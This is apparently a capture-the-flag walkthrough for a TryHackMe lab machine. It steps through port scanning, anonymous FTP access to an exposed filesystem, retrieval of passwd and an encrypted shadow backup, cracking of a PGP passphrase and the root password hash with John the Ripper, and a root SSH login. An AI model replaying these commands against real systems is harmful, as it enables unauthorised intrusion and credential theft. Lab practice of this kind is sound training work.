
# Anonforce

Room: [TryHackMe Anonforce](https://tryhackme.com/room/bsidesgtanonforce)

## Reconnaissance

First, I checked whether the target machine was accessible.

```bash
ping 10.49.129.203
```

The machine responded successfully, confirming connectivity.

To quickly identify open ports, I used RustScan.

```bash
rustscan -a 10.49.129.203
```

Open ports discovered:

```text
21/tcp → FTP
22/tcp → SSH
```

Next, I performed a detailed scan using Nmap.

```bash
nmap -sC -sV -p21,22 10.49.129.203
```

Result:

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
```

One important discovery from the scan:

```text
Anonymous FTP login allowed
```

This immediately became the main attack path.



## FTP Enumeration

Since anonymous login was enabled, I connected to FTP.

```bash
ftp 10.49.129.203
```

Logged in using:

```text
Username: anonymous
Password: anonymous
```

After logging in, I listed the contents.

```bash
ls
```

I noticed something unusual.

```text
Entire filesystem was exposed
```

Interesting directories:

```text
/etc
/home
/notread
/root
```

I moved to the user directory.

```bash
cd /home
ls
```

Found a user.

```text
melodias
```

Inside the home directory:

```bash
cd melodias
ls -al
```

Found:

```text
user.txt
.bash_history
.bashrc
.cache
.nano
```

Downloaded the user flag.

```bash
get user.txt
```

GOT THE USER FLAG.  

Then I tried checking for SSH keys.

```bash
cd .ssh
```

Result:

```text
550 Failed to change directory
```

No SSH keys were present.


## System Enumeration via FTP

Since the entire filesystem was exposed, I started checking system files.

Moved to `/etc`.

```bash
cd /etc
ls
```

I downloaded the passwd file.

```bash
get passwd
```

The shadow file existed but could not be downloaded.

```bash
get shadow
```

Result:

```text
550 Failed to open file
```

So direct credential extraction was blocked.


## Discovering Sensitive Files

During enumeration I noticed a suspicious writable directory.

```text
/notread
```

I checked its contents.

```bash
cd /notread
ls -al
```

Interesting files found:

```text
backup.pgp
private.asc
```

Downloaded both files.

```bash
get private.asc
get backup.pgp
```

This indicated the next step involved encrypted files.


## Cracking the PGP Private Key

First, I attempted importing the private key.

```bash
gpg --import private.asc
```

Import partially failed because the secret key required a passphrase.

So I extracted the hash.

Using John the Ripper helper:

```bash
gpg2john private.asc > hash.txt
```

Then cracked it.

```bash
john hash.txt /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Recovered passphrase:

```text
xbox360
```

Now I imported the key successfully.

```bash
gpg --import private.asc
```


## Decrypting the Backup File

Using the recovered passphrase, I decrypted the backup.

```bash
gpg --decrypt backup.pgp
```

The decrypted content revealed the system shadow file.

Output:

```text
root:$6$......
melodias:$1$......
```

This gave me password hashes for both root and melodias.


## Cracking Password Hashes

I first extracted the melodias hash.

```bash
echo 'melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1' > shadowhash.txt
```

Attempted cracking:

```bash
john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt shadowhash.txt
```

But No password was recovered.

So I moved to the root hash.

```bash
echo 'root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0' > roothash.txt
```

Cracked using John.

```bash
john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt roothash.txt
```

Recovered password:

```text
hikari
```


## SSH Access as Root

Since SSH was open, I directly connected as root.

```bash
ssh root@10.49.129.203
```

Password:

```text
hikari
```

Successfully logged in.

Verification:

```bash
whoami
```

Output:

```text
root
```

No privilege escalation was required because root credentials had already been recovered.


## Getting Root Flag

Inside root home directory:

```bash
ls
```

Found:

```text
root.txt
```

Reading the flag:

```bash
cat root.txt
```
GOT THE ROOT FLAG.

DONE!!!!!!!!!!!

